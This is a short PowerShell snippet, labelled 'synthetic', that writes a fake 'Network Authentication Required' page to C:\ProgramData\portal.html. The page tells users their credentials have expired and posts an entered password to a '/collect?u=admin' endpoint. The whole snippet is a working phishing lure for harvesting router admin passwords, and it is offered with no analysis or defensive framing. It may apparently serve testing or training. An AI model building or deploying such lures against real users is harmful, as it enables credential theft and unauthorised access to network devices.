# Synthetic RouterOS credential phishing lure dropper
$html = @"
<html>
<head><title>Network Authentication Required</title></head>
<body>
<p>Your credentials have expired. Re-authenticate below.</p>
<form action="/collect?u=admin" method="post">
<input type="password" name="pw" />
</form>
</body>
</html>
"@
Set-Content -Path "C:\ProgramData\portal.html" -Value $html
